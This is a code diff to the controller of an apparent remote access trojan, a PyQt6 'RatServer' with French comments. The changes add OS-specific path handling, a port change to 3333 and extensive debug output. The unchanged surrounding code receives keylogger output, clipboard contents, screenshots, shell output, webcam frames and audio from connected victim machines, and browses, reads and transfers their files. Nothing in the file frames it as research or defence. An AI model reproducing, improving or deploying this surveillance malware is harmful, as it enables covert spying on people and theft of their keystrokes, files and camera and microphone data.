@@ -13,6 +13,7 @@ from pathlib import Path
 from PyQt6.QtWidgets import *
 from PyQt6.QtCore import *
 from PyQt6.QtGui import *
+import platform
 
 # Configuration du logging
 logging.basicConfig(
@@ -65,10 +66,16 @@ class RatServer(QMainWindow):
         self.clients = {}
         self.current_paths = {}
         self.selected_client = None
-        self.download_path = os.path.expanduser("~/Downloads")
-        self.temp_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp")
-        self.screenshot_interval = 100  # Intervalle par défaut de 100ms
+        # Utiliser le bon chemin de base selon le système d'exploitation
+        if platform.system() == 'Windows':
+            self.download_path = os.path.expanduser("~/Downloads")
+            self.temp_dir = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp", "RAT")
+        else:
+            self.download_path = os.path.expanduser("~/Downloads")
+            self.temp_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp")
+            
         os.makedirs(self.temp_dir, exist_ok=True)
+        self.screenshot_interval = 100  # Intervalle par défaut de 100ms
         
         # Style
         self.setStyleSheet("""
@@ -508,7 +515,7 @@ class RatServer(QMainWindow):
         try:
             self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            self.server_socket.bind(('0.0.0.0', 8080))
+            self.server_socket.bind(('0.0.0.0', 3333))
             self.server_socket.listen(5)
             
             self.server_thread = threading.Thread(target=self.accept_clients)
@@ -526,19 +533,15 @@ class RatServer(QMainWindow):
         while self.server_running:
             try:
                 client_socket, address = self.server_socket.accept()
-                logger.info(f"Nouvelle connexion acceptée de {address[0]}:{address[1]}")
-                client_thread = threading.Thread(
-                    target=self.handle_client,
-                    args=(client_socket, address)
-                )
+                client_thread = threading.Thread(target=self.handle_client, args=(client_socket, address))
                 client_thread.daemon = True
                 client_thread.start()
             except Exception as e:
                 if self.server_running:
-                    logger.error(f"Erreur d'acceptation du client: {e}")
+                    logger.error(f"Error accepting client: {e}")
 
     def handle_client(self, client_socket, address):
-        """Gère la connexion d'un client."""
+        """Gère la connexion avec un client."""
         addr_str = f"{address[0]}:{address[1]}"
         logger.info(f"Gestion du client {addr_str}")
         
@@ -557,75 +560,58 @@ class RatServer(QMainWindow):
         
         try:
             while True:
-                try:
-                    # Lire d'abord la taille du message
-                    size_bytes = client_socket.recv(8)
-                    if not size_bytes:
-                        break
-                    
-                    size = int.from_bytes(size_bytes, byteorder='big')
-                    data = b""
-                    
-                    # Lire le message complet
-                    while len(data) < size:
-                        chunk = client_socket.recv(min(4096, size - len(data)))
-                        if not chunk:
-                            break
-                        data += chunk
-                    
-                    if len(data) < size:
-                        logger.error(f"Message incomplet reçu de {addr_str}")
-                        continue
-                    
-                    try:
-                        message = json.loads(data.decode())
-                        msg_type = message.get('type')
-                        
-                        if msg_type == 'system_info':
-                            self.system_info_received.emit(address, message['data'])
-                        elif msg_type == 'command_response':
-                            cmd = message.get('command')
-                            data = message.get('data', {})
-                            
-                            if cmd == 'list_processes':
-                                self.process_list_received.emit(address, data)
-                            elif cmd == 'list_directory':
-                                self.directory_listing_received.emit(address, data)
-                            elif cmd == 'read_file':
-                                logger.debug(f"Contenu du fichier reçu de {addr_str}")
-                                if isinstance(data, dict):
-                                    content = data.get('content', '')
-                                else:
-                                    content = data
-                                logger.debug(f"Type de contenu: {type(content)}")
-                                self.file_content_received.emit(address, content)
-                            elif cmd == 'write_file':
-                                logger.debug(f"Fichier écrit avec succès sur {addr_str}")
-                                QTimer.singleShot(500, self.refresh_files)
-                            elif cmd == 'rename_file':
-                                logger.debug(f"Fichier renommé avec succès sur {addr_str}")
-                                QTimer.singleShot(500, self.refresh_files)
-                            elif cmd == 'keylog':
-                                self.keylog_received.emit(address, data)
-                            elif cmd == 'clipboard':
-                                self.clipboard_received.emit(address, data)
-                            elif cmd == 'screenshot':
-                                self.screenshot_received.emit(address, data)
-                            elif cmd == 'shell_output':
-                                self.shell_output_received.emit(address, data)
-                            elif cmd == 'camera':
-                                self.camera_frame_received.emit(address, data)
-                            elif cmd == 'audio':
-                                self.audio_data_received.emit(address, data)
-                    
-                    except json.JSONDecodeError as e:
-                        logger.error(f"Erreur de décodage JSON pour {addr_str}: {str(e)}")
-                        continue
-                    
-                except socket.error as e:
-                    logger.error(f"Erreur socket pour {addr_str}: {str(e)}")
+                data = client_socket.recv(1048576)  # 1MB buffer
+                if not data:
                     break
-                
+                    
+                try:
+                    message = json.loads(data.decode())
+                    msg_type = message.get('type')
+                    
+                    if msg_type == 'system_info':
+                        self.system_info_received.emit(address, message['data'])
+                    elif msg_type == 'command_response':
+                        cmd = message.get('command')
+                        cmd_data = message.get('data', {})
+                        
+                        if cmd == 'list_processes':
+                            self.process_list_received.emit(address, cmd_data)
+                        elif cmd == 'list_directory':
+                            print(f"\n[DEBUG] Données de liste de répertoire reçues: {cmd_data}")
+                            if isinstance(cmd_data, dict) and 'entries' in cmd_data:
+                                entries = cmd_data['entries']
+                                print(f"[DEBUG] Émission du signal avec {len(entries)} entrées")
+                                self.directory_listing_received.emit(address, entries)
+                            else:
+                                print(f"[DEBUG] Format de données invalide: {cmd_data}")
+                        elif cmd == 'read_file':
+                            content = cmd_data.get('content', '') if isinstance(cmd_data, dict) else cmd_data
+                            self.file_content_received.emit(address, content)
+                        elif cmd == 'write_file':
+                            logger.debug(f"Fichier écrit avec succès sur {addr_str}")
+                            QTimer.singleShot(500, self.refresh_files)
+                        elif cmd == 'rename_file':
+                            logger.debug(f"Fichier renommé avec succès sur {addr_str}")
+                            QTimer.singleShot(500, self.refresh_files)
+                        elif cmd == 'keylog':
+                            self.keylog_received.emit(address, cmd_data)
+                        elif cmd == 'clipboard':
+                            self.clipboard_received.emit(address, cmd_data)
+                        elif cmd == 'screenshot':
+                            self.screenshot_received.emit(address, cmd_data)
+                        elif cmd == 'shell_output':
+                            self.shell_output_received.emit(address, cmd_data)
+                        elif cmd == 'camera':
+                            self.camera_frame_received.emit(address, cmd_data)
+                        elif cmd == 'audio':
+                            self.audio_data_received.emit(address, cmd_data)
+                except json.JSONDecodeError as e:
+                    logger.error(f"JSON decode error from {addr_str}: {e}")
+                except Exception as e:
+                    logger.error(f"Error receiving data from {addr_str}: {e}")
+                    break
+        except Exception as e:
+            logger.error(f"Client handler error for {addr_str}: {e}")
         finally:
             logger.info(f"Déconnexion du client {addr_str}")
             self.client_disconnected.emit(address)
@@ -710,6 +696,15 @@ class RatServer(QMainWindow):
                 'memory': info.get('memory', 0.0),
                 'status': 'Connected'
             }
+            # Initialiser le chemin selon l'OS du client
+            if 'Windows' in info.get('os', ''):
+                # Pour un client Windows, utiliser son chemin utilisateur
+                self.current_paths[addr_str] = os.path.expanduser("~")
+                logger.info(f"Client Windows détecté pour {addr_str}, chemin initial: {self.current_paths[addr_str]}")
+            else:
+                # Pour un client Linux/Unix
+                self.current_paths[addr_str] = os.path.expanduser("~")
+                logger.info(f"Client Unix détecté pour {addr_str}, chemin initial: {self.current_paths[addr_str]}")
         else:
             self.clients[addr_str].update({
                 'hostname': info.get('hostname', self.clients[addr_str]['hostname']),
@@ -718,6 +713,10 @@ class RatServer(QMainWindow):
                 'memory': info.get('memory', self.clients[addr_str]['memory']),
                 'status': 'Connected'
             })
+            # Mettre à jour le chemin si l'OS a changé
+            if 'Windows' in info.get('os', '') and 'Windows' not in self.clients[addr_str].get('os', ''):
+                self.current_paths[addr_str] = os.path.expanduser("~")
+                logger.info(f"OS changé vers Windows pour {addr_str}, mise à jour du chemin: {self.current_paths[addr_str]}")
 
     def remove_client(self, address):
         """Supprime un client de la liste."""
@@ -798,12 +797,27 @@ class RatServer(QMainWindow):
         """Liste le contenu du répertoire actuel."""
         if self.selected_client:
             addr = tuple(self.selected_client.split(':'))
+            print(f"\n[DEBUG] Client sélectionné: {self.selected_client}")
+            print(f"[DEBUG] OS du client: {self.clients[self.selected_client].get('os', 'Unknown')}")
+            
             if self.selected_client not in self.current_paths:
-                self.current_paths[self.selected_client] = os.path.expanduser("~")
+                print("[DEBUG] Initialisation du chemin pour le client")
+                # Détecter si le client est sous Windows
+                if 'Windows' in self.clients[self.selected_client].get('os', ''):
+                    self.current_paths[self.selected_client] = "C:\\Users\\Maxime"
+                    print(f"[DEBUG] Client Windows détecté, chemin initial: {self.current_paths[self.selected_client]}")
+                else:
+                    self.current_paths[self.selected_client] = os.path.expanduser("~")
+                    print(f"[DEBUG] Client Unix détecté, chemin initial: {self.current_paths[self.selected_client]}")
+            
+            current_path = self.current_paths[self.selected_client]
+            print(f"[DEBUG] Chemin actuel utilisé: {current_path}")
+            
             self.send_command(addr, {
                 'command': 'list_directory',
-                'data': {'path': self.current_paths[self.selected_client]}
+                'data': {'path': current_path}
             })
+            print(f"[DEBUG] Commande list_directory envoyée avec le chemin: {current_path}\n")
 
     def go_up(self):
         """Remonte d'un niveau dans l'arborescence."""
@@ -839,7 +853,7 @@ class RatServer(QMainWindow):
         file_paths, _ = QFileDialog.getOpenFileNames(
             self,
             "Select Files to Upload",
-            "",
+            self.download_path,  # Commencer dans le dossier Downloads
             "All Files (*.*)"
         )
         
@@ -853,6 +867,7 @@ class RatServer(QMainWindow):
                     data = f.read()
                     
                 file_name = os.path.basename(file_path)
+                # Utiliser os.path.join pour construire le chemin de manière compatible avec le système
                 dest_path = os.path.join(self.current_paths[self.selected_client], file_name)
                 
                 self.send_command(addr, {
@@ -885,10 +900,12 @@ class RatServer(QMainWindow):
         addr = tuple(self.selected_client.split(':'))
         file_path = os.path.join(self.current_paths[self.selected_client], file_name)
         
+        # Utiliser le dossier Downloads comme emplacement par défaut
+        default_path = os.path.join(self.download_path, file_name)
         save_path, _ = QFileDialog.getSaveFileName(
             self,
             "Save File",
-            file_name,
+            default_path,
             "All Files (*.*)"
         )
         
@@ -959,21 +976,90 @@ class RatServer(QMainWindow):
         except Exception as e:
             logger.error(f"Erreur lors de la mise à jour de la liste des processus pour {addr_str}: {e}")
 
-    def update_directory_listing(self, address, entries):
+    def update_directory_listing(self, address, data):
         """Met à jour la liste des fichiers."""
         addr_str = f"{address[0]}:{address[1]}"
         try:
             if addr_str == self.selected_client:
+                print(f"\n[DEBUG] Mise à jour de la liste des fichiers pour {addr_str}")
+                print(f"[DEBUG] Type de données reçues: {type(data)}")
+                print(f"[DEBUG] Contenu des données: {data}")
+                
+                # Vérifier si data est un dictionnaire et contient les entrées
+                if isinstance(data, dict):
+                    entries = data.get('entries', [])
+                    if 'error' in data:
+                        logger.error(f"Erreur de liste de répertoire pour {addr_str}: {data['error']}")
+                        return
+                elif isinstance(data, list):
+                    # Si data est une liste d'entrées directement
+                    entries = []
+                    for entry in data:
+                        if isinstance(entry, dict):
+                            entries.append(entry)
+                else:
+                    logger.error(f"Format de données non reconnu pour {addr_str}: {type(data)}")
+                    return
+                
+                print(f"[DEBUG] Nombre d'entrées reçues: {len(entries)}")
+                if entries:
+                    print(f"[DEBUG] Première entrée: {entries[0]}")
+                
+                # Effacer la table avant de la remplir
+                self.files_table.clearContents()
+                self.files_table.setRowCount(0)  # Réinitialiser le nombre de lignes
                 self.files_table.setRowCount(len(entries))
+                
+                # Ajouter les entrées à la table
                 for row, entry in enumerate(entries):
-                    self.files_table.setItem(row, 0, QTableWidgetItem(entry['name']))
-                    self.files_table.setItem(row, 1, QTableWidgetItem(entry['type']))
-                    self.files_table.setItem(row, 2, QTableWidgetItem(entry['size']))
-                    self.files_table.setItem(row, 3, QTableWidgetItem(entry['modified']))
-                self.path_edit.setText(self.current_paths[self.selected_client])
-                logger.debug(f"Liste des fichiers mise à jour pour {addr_str}: {len(entries)} entrées")
+                    if isinstance(entry, dict):
+                        try:
+                            # Créer les items pour chaque colonne
+                            name = str(entry.get('name', ''))
+                            type_ = str(entry.get('type', ''))
+                            size = str(entry.get('size', ''))
+                            modified = str(entry.get('modified', ''))
+                            
+                            print(f"[DEBUG] Traitement de l'entrée: nom={name}, type={type_}, taille={size}, modifié={modified}")
+                            
+                            name_item = QTableWidgetItem(name)
+                            type_item = QTableWidgetItem(type_)
+                            size_item = QTableWidgetItem(size)
+                            modified_item = QTableWidgetItem(modified)
+                            
+                            # Définir l'alignement
+                            size_item.setTextAlignment(Qt.AlignmentFlag.AlignRight | Qt.AlignmentFlag.AlignVCenter)
+                            modified_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
+                            
+                            # Ajouter les items à la table
+                            self.files_table.setItem(row, 0, name_item)
+                            self.files_table.setItem(row, 1, type_item)
+                            self.files_table.setItem(row, 2, size_item)
+                            self.files_table.setItem(row, 3, modified_item)
+                            
+                            print(f"[DEBUG] Ajouté à la table: {name} ({type_})")
+                        except Exception as e:
+                            print(f"[DEBUG] Erreur lors de l'ajout de l'entrée {entry.get('name')}: {e}")
+                            print(f"[DEBUG] Entrée complète: {entry}")
+                
+                # Mettre à jour le chemin actuel si disponible
+                if isinstance(data, dict) and 'current_path' in data:
+                    current_path = data['current_path']
+                    self.current_paths[self.selected_client] = current_path
+                    self.path_edit.setText(current_path)
+                    print(f"[DEBUG] Chemin actuel mis à jour: {current_path}")
+                
+                # Ajuster la taille des colonnes
+                self.files_table.resizeColumnsToContents()
+                self.files_table.resizeRowsToContents()
+                
+                print(f"[DEBUG] Table mise à jour avec {self.files_table.rowCount()} lignes")
+                
         except Exception as e:
             logger.error(f"Erreur lors de la mise à jour de la liste des fichiers pour {addr_str}: {e}")
+            print(f"[DEBUG] Exception complète: {str(e)}")
+            import traceback
+            print(f"[DEBUG] Traceback: {traceback.format_exc()}")
 
     def update_keylog(self, address, key):
         """Met à jour le keylogger."""
@@ -1123,6 +1209,11 @@ class RatServer(QMainWindow):
                 'memory': 0.0,
                 'status': 'Connected'
             }
+            # Initialiser le chemin actuel selon le système d'exploitation
+            if platform.system() == 'Windows':
+                self.current_paths[addr_str] = os.path.expanduser("~")
+            else:
+                self.current_paths[addr_str] = os.path.expanduser("~")
             print(f"New client connected: {addr_str}")
 
     def handle_client_disconnected(self, address):
